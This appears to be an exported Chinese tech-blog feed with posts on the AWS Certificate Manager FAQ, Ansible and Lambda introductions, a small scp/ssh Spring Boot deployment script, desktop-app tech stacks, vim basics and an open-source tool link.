时，它会应用强加密和密钥管理最佳实践来确保证书私有密钥的安全。借助 ACM，您可以使用 AWS 管理控制台、AWS CLI 或 AWS Certificate Manager API 集中管理 AWS Certificate Manager 在 AWS 区域内提供的所有 SSL/TLS 证书。AWS Certificate Manager 集成了其他 AWS 服务，因此您可以请求 SSL/TLS 证书，然后通过 AWS 管理控制台、AWS CLI 命令或 API 调用为 Elastic Load Balancing 负载均衡器或 Amazon CloudFront 分配预置证书。</p><p>问：如何开始使用 ACM？</p><p>要开始使用 AWS Certificate Manager，请导航到 AWS 管理控制台中的“Certificate Manager”，然后使用向导输入站点的名称以请求 SSL/TLS 证书。您也可以使用 AWS CLI 或 API 请求证书。在 ACM 获得域所有者的批准并且系统颁发 SSL/TLS 证书后，您就可以将其用于与 ACM 集成的其他 AWS 资源了。您只需从 AWS 管理控制台的下拉列表中选择您要部署的 SSL/TLS 证书即可。或者，您也可以执行一个 AWS CLI 命令或调用一个 AWS API，将该证书与您的资源关联起来。AWS Certificate Manager 随后会将该证书部署到您选择的资源。有关请求和使用 AWS Certificate Manager 所提供证书的更多信息，请参阅《AWS Certificate Manager 用户指南》中的入门。</p><p>问：ACM 提供哪种类型的证书？</p><p>ACM 提供域验证 (DV) 证书，供终止 SSL/TLS 的网站和应用程序使用。有关 ACM 提供的证书的更多详细信息，请参阅证书特点。</p><p>问：我可以将 ACM 提供的证书用于哪些 AWS 服务？</p><p>您可以将 ACM 用于以下 AWS 服务：<br>• Elastic Load Balancing – 请参阅 Elastic Load Balancing 文档<br>• Amazon CloudFront – 请参阅 CloudFront 文档<br>• Amazon API Gateway – 请参阅 API Gateway 文档<br>• AWS Elastic Beanstalk – 请参阅 AWS Elastic Beanstalk 文档<br>问：ACM 提供的证书是否适合政府部门？</p><p>ACM 证书可能适合部分政府部门，而并非对所有政府部门均适合。请查看当地法律、规则和法规，以确定某个 ACM 证书是否适合。如有任何疑问，请访问 AWS Support 中心并创建案例。</p><p>问：ACM 在哪些区域提供？</p><p>请访问 AWS 全球基础设施页面，了解目前提供 AWS 服务的区域。要将 ACM 证书与 Amazon CloudFront 配合使用，您必须在美国东部 (弗吉尼亚北部) 区域申请或导入该证书。该区域内与 CloudFront 分配关联的 ACM 证书将被分发到为该分配配置的所有地理位置。</p><p>问：我是否可以在多个 AWS 区域使用同一证书？</p><p>这要取决于您目前使用的是 Elastic Load Balancing 还是 Amazon CloudFront。要在不同区域内针对同一站点 (具有相同的完全限定域名 (FQDN) 或 FQDN 集) 将某个证书与 Elastic Load Balancing 配合使用，您需要为计划使用证书的每个区域申请新证书。请注意，还需要针对新区域重新验证证书中的每个名称。要将 ACM 证书与 Amazon CloudFront 配合使用，您必须在美国东部 (弗吉尼亚北部) 区域申请该证书。该区域内与 CloudFront 分配关联的 ACM 证书将被分发到为该分配配置的所有地理位置。</p><p>问：是否可以在区域之间复制证书？</p><p>目前不可以。</p><p>问：如果同一域名我已拥有来自其他提供商的证书，我是否还能够使用 ACM 配置证书？</p><p>是。<br>问：我是否可以在 Amazon EC2 实例或自己的服务器上使用证书？</p><p>不可以。目前，ACM 提供的证书只能用于特定 AWS 服务。请参阅我可以将 ACM 提供的证书用于哪些 AWS 服务？</p><p>问：我能够通过 ACM 预置的证书数量是否有限制？</p><p>默认情况下，您可以在每个区域中为每个账户预置多达 100 个证书。通过 ACM 预置的每个证书最多可以拥有 10 个完全限定域名。您可以访问 AWS Support 中心请求增加上限。有关更多详细信息，请参阅 AWS 文档。</p><h3 id="预置证书"><a href="#预置证书" class="headerlink" title="预置证书"></a>预置证书</h3><p>问：如何预置 ACM 提供的证书？</p><p>您可以使用 AWS 管理控制台、AWS CLI 或 ACM API/SDK 进行预置。要使用 AWS 管理控制台，请导航到控制台的 ACM 部分，选择“Request a Certificate”，输入站点的域名，然后按照屏幕上的说明完成请求。如果用户可以通过其他名称访问您的站点，则可以在请求中添加其他域名。域的所有者会收到一封关于请求批准颁发证书的电子邮件。在请求中的所有域名获得域所有者的批准后，系统将颁发证书并准备好预置证书以用于其他 AWS 服务，如 Elastic Load Balancing 或 Amazon CloudFront。有关详细信息，请参阅 ACM 文档。<br>问：颁发证书需要多长时间？</p><p>获得域的所有者或域所有者授权代表的批准后，系统通常会在几分钟内颁发证书，但也可能需要更长时间。有关更多详细信息，请参阅如何预置 ACM 提供的证书？<br>问：请求证书时会发生什么情况？</p><p>为了验证您对请求的证书中包括的域名或名称的控制权，系统会针对证书请求中的每个域名向注册域的所有者发送电子邮件。在域的所有者或授权代表批准证书请求之前，证书请求将处于待验证状态。域的所有者或授权代表 (审批者) 可以按照电子邮件中的说明批准证书请求。说明将指引审批者导航到审批网站，单击电子邮件中的链接或将电子邮件中的链接粘贴到浏览器中，以导航到审批网站。审批者确认与证书请求相关的信息，如域名、证书 ID (ARN) 以及发出请求的 AWS 账户 ID，如果信息准确无误，则批准请求。在证书请求中的所有域名获得批准后，系统通常会在几分钟内颁发证书，届时证书请求的状态将变为已颁发。获得颁发的证书后，您便可以开始将其用于其他 AWS 服务。<br>问：审批请求要发送到哪个电子邮件地址？<br>当您请求证书时，系统会针对证书请求中的每个域名使用 WHOIS 查找来检索该域的联系人信息。电子邮件会发送至针对该域列出的域注册人、管理联系人和技术联系人。电子邮件还会同时发送至域的五个特定电子邮件地址，即在您请求的域名前加上 admin@、administrator@、hostmaster@、webmaster@ 和 postmaster@ 生成的五个地址。例如，如果您为 server.example.com 请求证书，系统将使用针对 example.com 域，外加 <a href="mailto:admin@server.example.com" target="_blank" rel="noopener">admin@server.example.com</a>、<a href="mailto:administrator@server.example.com" target="_blank" rel="noopener">administrator@server.example.com</a>、<a href="mailto:hostmaster@server.example.com" target="_blank" rel="noopener">hostmaster@server.example.com</a>、<a href="mailto:postmaster@server.example.com" target="_blank" rel="noopener">postmaster@server.example.com</a> 和 <a href="mailto:webmaster@server.example.com" target="_blank" rel="noopener">webmaster@server.example.com</a> 的 WHOIS 查询返回的联系人信息将电子邮件发送至域注册人、技术联系人和管理联系人。</p><p>针对以“www”开头的域名或以星号 (*) 开头的通配符名称，这五个特定电子邮件地址采用不同的构造方式。ACM 会删除前导的“www”或星号，而电子邮件则被发送到通过在域名其余部分之前加上 admin@、administrator@、hostmaster@、postmaster@ 和 webmaster@ 来构造的管理员地址。例如，如果您为 <a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a> 请求证书，则电子邮件被发送到 WHOIS 联系人 (如前所述) 以及 <a href="mailto:admin@example.com" target="_blank" rel="noopener">admin@example.com</a>，而不是 <a href="mailto:admin@www.example.com" target="_blank" rel="noopener">admin@www.example.com</a>。其余四个特定电子邮件地址也采用类似的方式构造。</p><p>请求证书之后，您可以使用 ACM 控制台、AWS CLI 或 API 查看针对各个域发送的电子邮件的收件方电子邮件地址列表。<br>问：我是否可以配置接收证书审批请求的电子邮件地址？</p><p>不可以，不过您可以配置用于接收验证电子邮件的基础域名。基础域名必须是证书请求中域名的超级域。例如，如果您想为 server.domain.example.com 请求证书，但希望将审批电子邮件发送至 <a href="mailto:admin@domain.example.com" target="_blank" rel="noopener">admin@domain.example.com</a>，则可以使用 AWS API 或 API 实现这一目的。有关更多详细信息，请参阅 ACM CLI 参考和 ACM API 参考。<br>问：我是否可以使用具有代理联系人信息 (例如 Privacy Guard 或 WhoisGuard) 的域？</p><p>可以；不过，电子邮件的发送可能会因为代理而延迟。通过代理发送的电子邮件可能会进入您的垃圾邮件文件夹。有关故障排除建议，请参阅 ACM 用户指南。</p><p>问：ACM 是否可以通过我的 AWS 账户的技术联系人验证我的身份？</p><p>不可以。验证域所有者身份的流程和策略非常严格，并且由为公开可信的证书颁发机构设置策略标准的 CA/Browser Forum 决定。要了解详情，请参阅 Amazon Trust Services 存储库中最新的“Amazon Trust Services 认证规范声明”。<br>问：我的证书请求状态为什么是“待验证”？</p><p>已发出请求但未经过批准的证书的状态为待验证。域的所有者或授权代表必须批准证书请求，然后系统才能颁发证书。</p><p>问：如果我没有收到验证和批准电子邮件，该怎么做？</p><p>有关故障排除建议，请参阅 ACM 用户指南。</p><p>问：我的证书请求状态为什么显示为“失败”？</p><p>有多种原因会导致域的验证控制流程失败，包括但不限于：网络资源的网址列表中包括的域被认定为包含恶意软件或欺诈性内容。要确定申请失败的原因，请访问 ACM 故障排除指南。</p><p>问：我的证书请求状态为什么显示为“验证超时”？</p><p>如果 ACM 证书请求在 72 小时内没有接受验证，则被视为超时。有关故障排除建议，请参阅 ACM 用户指南。</p><p>问：是否有其他方法来验证域或审批支持的证书？</p><p>目前没有。</p><h3 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h3><p>问：浏览器、操作系统和移动设备是否信任 ACM 提供的证书？</p><p>目前的绝大部分浏览器、操作系统和移动设备都信任 ACM 提供的证书。ACM 提供的证书在浏览器和操作系统中的普及率高达 99%，包括 Windows XP SP3 和 Java 6 及更高版本。</p><p>问：如何确认我的浏览器是否信任 ACM 提供的证书？</p><p>信任 ACM 提供的证书的浏览器会显示一个锁形图标，并且在连接到使用 ACM 基于 SSL/TLS 提供的证书 (例如使用 HTTPS) 的站点时会显示不要颁发证书的警告。</p><p>ACM 提供的证书由亚马逊的证书颁发机构 (CA) 进行验证。任何包含 Amazon Root CA 1、Starfield Services Root Certificate Authority – G2 或 Starfield Class 2 Certification Authority 的浏览器、应用程序和操作系统均会信任由 ACM 提供的证书。</p><p>问：ACM 是否可以提供包括多个域名的证书？</p><p>可以。每个证书必须包括至少一个域名，并且您可以根据需要在证书中添加更多域名。例如，您可以将域名“<a href="http://www.example.net”添加到用于“www.example.com”的证书，前提是用户通过这两个域名都可以访问您的站点。对于证书请求中包括的所有名称，您必须具有所有权和控制权。" target="_blank" rel="noopener">www.example.net”添加到用于“www.example.com”的证书，前提是用户通过这两个域名都可以访问您的站点。对于证书请求中包括的所有名称，您必须具有所有权和控制权。</a></p><p>问：什么是通配符域名？</p><p>通配符域名匹配域中的所有第一级子域或主机名。第一级子域是一个不包含句号 (圆点) 的域名标签。例如，您可以使用名称“*.example.com”保护 <a href="http://www.example.com、images.example.com" target="_blank" rel="noopener">www.example.com、images.example.com</a> 以及以 .example.com 结尾的任何其他主机名或第一级子域。有关更多详细信息，请参阅 ACM 用户指南。</p><p>问：ACM 是否可以提供带有通配符域名的证书？</p><p>可以。</p><p>问：ACM 是否提供组织验证 (OV) 或扩展验证 (EV) 证书？</p><p>目前不提供。</p><p>问：ACM 是否为网站提供除 SSL/TLS 以外的其他类型的证书？</p><p>目前不提供。</p><p>问：我是否可以使用 ACM 提供的证书进行代码签名或电子邮件加密？</p><p>不可以。</p><p>问：ACM 是否提供用于签名和加密电子邮件的证书 (S/MIME 证书) ？</p><p>目前不提供。</p><p>问：ACM 提供的证书使用哪些算法？</p><p>ACM 证书使用的是采用 2048 位模数和 SHA-256 的 RSA 密钥。</p><p>问：ACM 是否支持椭圆曲线 (ECDSA) 证书？</p><p>目前不支持。<br>问：亚马逊在哪里介绍其关于颁发证书的策略和规范？</p><p>“Amazon Trust Services 证书策略”和“Amazon Trust Services 证书规范声明”文档中提供了相关信息。有关最新版本，请参阅 Amazon Trust Services 存储库。</p><p>问：如何撤销证书？</p><p>您可以访问 AWS Support 中心并创建案例，以请求 ACM 撤销证书。 </p><p>问：如果证书中的信息发生更改，我该如何通知 AWS？</p><p>您可以发送电子邮件至 validation-questions[at]amazon.com，通知 AWS。</p><p> </p><h3 id="私有密钥保护"><a href="#私有密钥保护" class="headerlink" title="私有密钥保护"></a>私有密钥保护</h3><p>问：ACM 提供的证书的私有密钥是如何管理的？</p><p>系统会为 ACM 提供的每个证书创建一个键前缀。AWS Certificate Manager 可保护并管理用于 SSL/TLS 证书的私有密钥。ACM 会运用强加密和密钥管理最佳实践来保护并存储私有密钥。</p><p>问：ACM 是否可以跨 AWS 区域复制证书？</p><p>不可以。每个 ACM 证书私有密钥均存储在您请求该证书的区域。例如，当您在弗吉尼亚北部区域获得新的证书后，ACM 会将私有密钥存储在弗吉尼亚北部区域。仅当 ACM 证书与 CloudFront 分配关联时，该证书才能跨区域复制。在这种情况下，CloudFront 会将 ACM 证书分配到为您的分配配置的地理位置。</p><p>问：我是否可以对证书私有密钥的使用进行审核？</p><p>可以。您可以使用 AWS CloudTrail 查看日志，从而了解证书私有密钥的使用时间。</p><h3 id="记账功能"><a href="#记账功能" class="headerlink" title="记账功能"></a>记账功能</h3><p>问：ACM 证书的使用如何收费和计费？</p><p>通过 AWS Certificate Manager 预置、管理和部署的 SSL/TLS 证书可免费使用。您只需针对为运行应用程序而创建的 AWS 资源付费，例如 Elastic Load Balancing 负载均衡器或 Amazon CloudFront 分配。</p><h3 id="详细信息"><a href="#详细信息" class="headerlink" title="详细信息"></a>详细信息</h3><p>问：我是否可以将同一证书用于多个 Elastic Load Balancing 负载均衡器和多个 CloudFront 分配？</p><p>可以。</p><p>问：我是否可以将证书用于没有公共 Internet 访问权限的内部 Elastic Load Balancing 负载均衡器？</p><p>可以。请参阅托管更新与部署，详细了解 ACM 如何处理无法通过公共 Internet 访问的证书的更新问题。</p><p>问：用于 <a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a> 的证书是否也能用于 example.com？</p><p>不可以。如果您希望自己的站点能够被两个域名 (<a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a> 和 example.com) 引用，则必须请求包含这两个名称的证书。</p><p>问：我是否可以导入第三方证书并将其用于 AWS 服务？</p><p>可以。如果想要将第三方证书与 Amazon CloudFront 或 Elastic Load Balancing 配合使用，您可以使用 AWS 管理控制台、AWS CLI 或 AWS Certificate Manager API 将该证书导入 ACM。ACM 不会处理已导入证书的更新流程。您可以使用 AWS 管理控制台监控已导入证书的到期日期，并导入新的第三方证书以便替换即将过期的证书。</p><p>问：ACM 提供的证书的有效期是多久？</p><p>目前，ACM 提供的证书的有效期为 13 个月。</p><p>问：ACM 如何帮助我的企业或组织满足合规性要求？</p><p>使用 ACM 可以轻松确保连接的安全性 (这也是 PCI、 FedRAMP 以及 HIPAA 等众多合规性计划的共同要求)，从而帮助您遵守法规要求。有关合规性的具体信息，请参阅 <a href="http://aws.amazon.com/compliance。" target="_blank" rel="noopener">http://aws.amazon.com/compliance。</a></p><p>问：ACM 是否有服务等级协议 (SLA)？</p><p>目前没有。</p><p>问：ACM 是否允许域名 (也称为国际化域名 (IDN)) 中包含本地语言字符？</p><p>ACM 不支持采用 Unicode 编码的本地语言字符；不过，ACM 支持域名使用 ASCII 编码的本地语言字符。</p><p>问：ACM 支持哪些域名标签格式？</p><p>ACM 仅支持采用 UTF-8 编码的 ASCII 字符，包括包含“xn-”的标签 (通常称为域名的 Punycode)。ACM 不支持域名中使用 Unicode 输入 (Unicode 标签)。</p><p>问：ACM 是否会提供一个可以在我的网站上显示的安全站点签章或信任徽标？</p><p>不会。如果您想使用站点签章，您可以从第三方供应商处获得。我们建议选择可评估和维护您站点和/或业务实践的安全性的供应商。</p><p>问：亚马逊是否允许将其商标或徽标用作证书徽章、站点签章或信任徽标？</p><p>不允许。此类签章和徽章可复制到不使用 ACM 服务的站点，但不能假借亚马逊名号建立信任。为保护我们的客户和亚马逊的声誉，我们不允许以这种方式使用我们的徽标。</p><h3 id="日志记录"><a href="#日志记录" class="headerlink" title="日志记录"></a>日志记录</h3><p>问：AWS CloudTrail 提供哪些日志记录信息？</p><p>您可以确定哪些用户和账户为支持 AWS CloudTrail 的服务调用了 AWS API、发出调用的源 IP 地址以及调用发生的时间。例如，您可以确定哪些用户为关联 ACM 提供的证书与 Elastic Load Balancer 调用了 API，以及 Elastic Load Balancing 服务使用 KMS API 调用加密密钥的时间。</p><h3 id="托管更新与部署"><a href="#托管更新与部署" class="headerlink" title="托管更新与部署"></a>托管更新与部署</h3><p>问：什么是 ACM 托管更新与部署？</p><p>ACM 托管更新与部署可以管理由 ACM 提供的 SSL/TLS 证书的更新流程并部署更新后的证书。</p><p>问：使用 ACM 托管更新与部署有哪些优势？</p><p>ACM 可帮助您管理 SSL/TLS 证书的更新和部署。与容易出错的手动流程相比，ACM 能够让安全 Web 服务或应用程序的 SSL/TLS 配置和维护具有更高的操作可靠性。托管更新与部署有助于您避免因证书过期导致的停机。ACM 托管更新与部署不需要您在自己的站点安装或维护软件客户端或代理。ACM 会作为一种服务运行，并且与其他 AWS 服务集成。这意味着，您可以使用 AWS 管理控制台、AWS CLI 或 API 在 AWS 平台上集中管理和部署证书。</p><p>问：哪些证书可以自动更新和部署？</p><p>ACM 能够更新并部署 ACM 提供的证书，而无需域的所有者进行任何其他审批或介入。如果证书必须经过附加审批才能更新，ACM 会基于证书中的所有域名向相应域的所有者提出审批请求，以此管理更新流程。在证书中的所有域名均获得批准后，ACM 会更新证书并自动将其部署到您的 AWS 资源。如果域的所有者没有批准证书，我们会通知您 (AWS 账户所有者)。为了提高 ACM 自动更新和部署 ACM 提供的证书的能力，请确保证书正在使用，且证书中包括的所有域名均能解析至您的站点，并可通过 Internet 访问。<br>问：ACM 何时更新证书？</p><p>ACM 最早可在证书过期前 60 天开始执行更新流程。目前，ACM 提供的证书的验证期限是 13 个月。请参阅 ACM 用户指南，了解有关托管续订的更多信息。</p><p>问：在更新证书和部署新证书之前，我是否会收到通知？</p><p>不会。ACM 可能会在不提前通知的情况下更新证书或更新密钥，并更换旧的证书。</p><p>问：ACM 是否可以更新包含裸域 (也称为顶级域名，例如“example.com”) 的证书？</p><p>为了提高 ACM 自动更新和部署包含裸域的证书的能力，请确保裸域的 DNS 查找能够解析至与该证书关联的 AWS 资源。将裸域解析到 AWS 资源可能非常困难，除非您使用 Route 53 或支持别名资源记录 (或同类记录) 的其他 DNS 提供商，从而将裸域映射到 AWS 资源。有关更多信息，请参阅 Route 53 开发人员指南。</p><p>问：在 ACM 部署更新后的证书时，我的站点是否会断开现有连接？</p><p>不会。在部署新证书之后建立的连接将使用新证书，而现有连接不会受到影响。</p>]]></content>
      
      
      <categories>
          
          <category> 运维开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Ansible 入门和使用</title>
      <link href="/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/ansible/"/>
      <url>/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/ansible/</url>
      
        <content type="html"><![CDATA[<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>直接执行 ad-hoc 命令</p><blockquote><p>ansible [hosts] comamnd -a “echo xxx”;</p></blockquote><h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><ul><li>官网: <a href="https://www.ansible.com/get-started" target="_blank" rel="noopener">https://www.ansible.com/get-started</a></li><li>工作原理:<a href="https://www.ansible.com/how-ansible-works" target="_blank" rel="noopener">https://www.ansible.com/how-ansible-works</a></li><li>下载和安装:<a href="http://docs.ansible.com/ansible/latest/intro_installation.html" target="_blank" rel="noopener">http://docs.ansible.com/ansible/latest/intro_installation.html</a></li><li>编写自己的脚本:<a href="http://docs.ansible.com/ansible/latest/playbooks.html" target="_blank" rel="noopener">http://docs.ansible.com/ansible/latest/playbooks.html</a></li><li><p>一些ansible 例子:<a href="https://github.com/ansible/ansible-examples" target="_blank" rel="noopener">https://github.com/ansible/ansible-examples</a></p></li><li><p>使用ansible playbook部署LAMP<br><a href="https://github.com/ansible/ansible-examples/tree/master/lamp_simple" target="_blank" rel="noopener">https://github.com/ansible/ansible-examples/tree/master/lamp_simple</a></p></li><li><p>w3school 的一个教程 <a href="https://www.w3cschool.cn/automate_with_ansible/automate_with_ansible-db6727oq.html" target="_blank" rel="noopener">https://www.w3cschool.cn/automate_with_ansible/automate_with_ansible-db6727oq.html</a></p></li><li><p>我的常用脚本仓库 <a href="https://github.com/linksgo2011/deployment-automation" target="_blank" rel="noopener">https://github.com/linksgo2011/deployment-automation</a></p></li><li><p>ansible role 市场 <a href="https://galaxy.ansible.com/" target="_blank" rel="noopener">https://galaxy.ansible.com/</a>  </p></li></ul><h3 id="检查模式-“Dry-Run”"><a href="#检查模式-“Dry-Run”" class="headerlink" title="检查模式(“Dry Run”)"></a>检查模式(“Dry Run”)</h3><p>ansible version 1.1 后提供了一种dryrun环境，使得我们可以测试我们的脚本而不造成任何changes</p><p><a href="http://docs.ansible.com/ansible/latest/playbooks_checkmode.html#id1" target="_blank" rel="noopener">http://docs.ansible.com/ansible/latest/playbooks_checkmode.html#id1</a></p><p>Example:</p><pre><code>ansible-playbook foo.yml --check</code></pre><h3 id="Ansible-test"><a href="#Ansible-test" class="headerlink" title="Ansible test"></a>Ansible test</h3><p><a href="http://docs.ansible.com/ansible/latest/dev_guide/testing.html" target="_blank" rel="noopener">http://docs.ansible.com/ansible/latest/dev_guide/testing.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 运维开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Lambda 入门</title>
      <link href="/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/aws%20lambda/"/>
      <url>/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/aws%20lambda/</url>
      
        <content type="html"><![CDATA[<h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><p>Official website:<br><a href="http://docs.aws.amazon.com/zh_cn/lambda/latest/dg/lambda-app.html" target="_blank" rel="noopener">http://docs.aws.amazon.com/zh_cn/lambda/latest/dg/lambda-app.html</a></p><p>A video tutorial:<br><a href="https://www.lynda.com/Amazon-Web-Services-tutorials/Serverless-architectures-AWS-Lambda/569195/617984-4.html?srchtrk=index%3a3%0alinktypeid%3a2%0aq%3alambda+aws%0apage%3a1%0as%3arelevance%0asa%3atrue%0aproducttypeid%3a2" target="_blank" rel="noopener">https://www.lynda.com/Amazon-Web-Services-tutorials/Serverless-architectures-AWS-Lambda/569195/617984-4.html?srchtrk=index%3a3%0alinktypeid%3a2%0aq%3alambda+aws%0apage%3a1%0as%3arelevance%0asa%3atrue%0aproducttypeid%3a2</a></p><h2 id="什么是Lambda？"><a href="#什么是Lambda？" class="headerlink" title="什么是Lambda？"></a>什么是Lambda？</h2><p>AWS Lambda 是一项计算服务，可使您无需预配置或管理服务器即可运行代码。AWS Lambda 只在需要时执行您的代码并自动缩放，从每天几个请求到每秒数千个请求。您只需按消耗的计算时间付费 – 代码未运行时不产生费用。借助 AWS Lambda，您几乎可以为任何类型的应用程序或后端服务运行代码，而且无需执行任何管理。AWS Lambda 在可用性高的计算基础设施上运行您的代码，执行计算资源的所有管理工作，其中包括服务器和操作系统维护、容量预置和自动扩展、代码监控和记录。您只需要以 AWS Lambda 支持的一种语言 (目前为 Node.js、Java、C# 和 Python) 提供您的代码。</p><h2 id="为什么需要学习它？"><a href="#为什么需要学习它？" class="headerlink" title="为什么需要学习它？"></a>为什么需要学习它？</h2><p>Lambda 提供了一种与环境无关的代码执行平台，更加灵活去使用</p><h2 id="这项技术定位"><a href="#这项技术定位" class="headerlink" title="这项技术定位"></a>这项技术定位</h2><p>新技术可以用在私人或者试用项目中，产品环境暂时不推荐使用，类似于BAE等平台</p><h2 id="Scope"><a href="#Scope" class="headerlink" title="Scope"></a>Scope</h2><p>实际上Lambda 包含了函数和事件系统。在AWS中可以设定各种不同的事件源来trigger我们的Lambda函数</p><h2 id="构建-Lambda-函数"><a href="#构建-Lambda-函数" class="headerlink" title="构建 Lambda 函数"></a>构建 Lambda 函数</h2><p>Lambda函数可以在本地开发环境中开发，然后上传到AWS平台上运行。目前AWS支持四种编程语言：</p><ul><li>Nodejs</li><li>Java</li><li>Python</li><li>C#</li></ul><p>编写相关的程序需要遵守一些基本程序结构，因此AWS能解析并执行。</p><p>## </p>]]></content>
      
      
      <categories>
          
          <category> 运维开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用SSH实现自动化部署</title>
      <link href="/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/auto%20deployment%20with%20ssh/"/>
      <url>/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/auto%20deployment%20with%20ssh/</url>
      
        <content type="html"><![CDATA[<h2 id="相关解决方案"><a href="#相关解决方案" class="headerlink" title="相关解决方案"></a>相关解决方案</h2><p>在web项目中有时候，需要部署代码上线，因此有一些问题在于怎么自动化部署。通常的做法是使用CI/CD平台配合自定义的脚本来实现。</p><ul><li>对于PHP可以使用git、SVN直接同步代码，配合Puppet使用</li><li>Java和前端等项目可以使用包管理来发布</li></ul><h2 id="小型SSH部署代码实现"><a href="#小型SSH部署代码实现" class="headerlink" title="小型SSH部署代码实现"></a>小型SSH部署代码实现</h2><p>对于小型团队和自己的项目贴一段用SSH实现的Spring boot部署方案</p><p>SCP jar文件到远程服务器</p><pre><code class="shell">scp -i &quot;./.circleci/aws.pem&quot; whoisspy-0.0.1-SNAPSHOT.jar ubuntu@ec2-18-217-113-62.us-east-2.compute.amazonaws.com:/home/ubuntu/workspace/whoisspy-0.0.1-SNAPSHOT.jar</code></pre><p>kill原来的端口，然后启动新的进程</p><pre><code class="shell">ssh -i &quot;./.circleci/aws.pem&quot; ubuntu@ec2-18-217-113-62.us-east-2.compute.amazonaws.com &#39;ls            cd workspace            #kill old instance            output=$( netstat -apn | grep 8086 | grep LISTEN) &amp;&amp; read num1 num2 num3 num4 num5  &lt;&lt;&lt;${output//[^0-9]/ } &amp;&amp; kill -9 $num5 || pwd            # todo start new instance            java -jar whoisspy-0.0.1-SNAPSHOT.jar &gt; /dev/null 2&gt;&amp;1 &amp;            # test if it has been started            netstat -apn | grep 8086&#39;</code></pre><p>清理本地SSH链接</p><pre><code class="shell">pid=$( ps aux | grep amazonaws | awk &#39;{print $2}&#39; | sort -n | head -n 1 )leep 5 &amp;&amp; kill ${pid} &amp;&amp; echo &quot;ssh command is complete&quot;</code></pre><p>关于怎么远程执行命令并合理退出，参考了文章：<a href="http://blog.csdn.net/fdipzone/article/details/23000201" target="_blank" rel="noopener">http://blog.csdn.net/fdipzone/article/details/23000201</a></p>]]></content>
      
      
      <categories>
          
          <category> 运维开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>桌面应用开发架构</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/Desktopapp%20tech%20stack/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/Desktopapp%20tech%20stack/</url>
      
        <content type="html"><![CDATA[<h3 id="Python-开发方案-快速高效、跨平台，推荐"><a href="#Python-开发方案-快速高效、跨平台，推荐" class="headerlink" title="Python 开发方案 (快速高效、跨平台，推荐)"></a>Python 开发方案 (快速高效、跨平台，推荐)</h3><ul><li>Python </li><li>Wxpython </li><li>Pycharm </li><li>Pyinstaller </li></ul><h3 id="Web混合开发方案"><a href="#Web混合开发方案" class="headerlink" title="Web混合开发方案"></a>Web混合开发方案</h3><ul><li>Electron</li><li>Photonkit</li></ul><p>使用Electron混合开发桌面应用<br>参考文档：<a href="https://github.com/amhoho/electron-cn-docs" target="_blank" rel="noopener">https://github.com/amhoho/electron-cn-docs</a><br>缺点是包过大</p><h3 id="易语言"><a href="#易语言" class="headerlink" title="易语言"></a>易语言</h3><ul><li>易语言</li></ul><p>简单使用，缺点不能跨平台</p><h3 id="Xamarin"><a href="#Xamarin" class="headerlink" title="Xamarin"></a>Xamarin</h3><ul><li>C# </li><li>Xamarin</li></ul><p>能构建IOS/Android/Mac/Window平台</p><h3 id="Monodeveloper"><a href="#Monodeveloper" class="headerlink" title="Monodeveloper"></a>Monodeveloper</h3><ul><li>C#</li><li>Monodeveloper</li></ul><p>参考资料：<a href="http://www.monodevelop.com/" target="_blank" rel="noopener">http://www.monodevelop.com/</a><br>C# 开发简单，能调用系统API，目前.net 能方便跨平台 </p><h3 id="Duilib-技术"><a href="#Duilib-技术" class="headerlink" title="Duilib 技术"></a>Duilib 技术</h3><ul><li>duilib</li><li>C++</li></ul><p>Duilib界面开发效率非常高</p><h3 id="QT"><a href="#QT" class="headerlink" title="QT"></a>QT</h3><ul><li>QT </li><li>Qt Creater</li></ul><p>跨平台，但是C++语言层面难度太大</p>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>VIM 简明命令</title>
      <link href="/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/tool/vim-commands/"/>
      <url>/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/tool/vim-commands/</url>
      
        <content type="html"><![CDATA[<p><img src="/开发工具/tool/vim-commands/vi-vim-cheat-sheet-sch.gif" alt=""></p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><ul><li>ESC 健进入命令模式</li><li>i/a 进入插入模式</li><li>:/ 进入退出模式</li></ul><h2 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h2><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.runoob.com/linux/linux-vim.html" target="_blank" rel="noopener">https://www.runoob.com/linux/linux-vim.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 开发工具 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>常用开源项目收集</title>
      <link href="/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/common-tools/"/>
      <url>/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/common-tools/</url>
      
        <content type="html"><![CDATA[<p><a href="http://veyon.io/#" target="_blank" rel="noopener">http://veyon.io/#</a></p><p>非常不错的开源教学软件</p><p><img src="http://veyon.io/img/veyon-features.png" alt=""></p>]]></content>
      
      
      <categories>
          
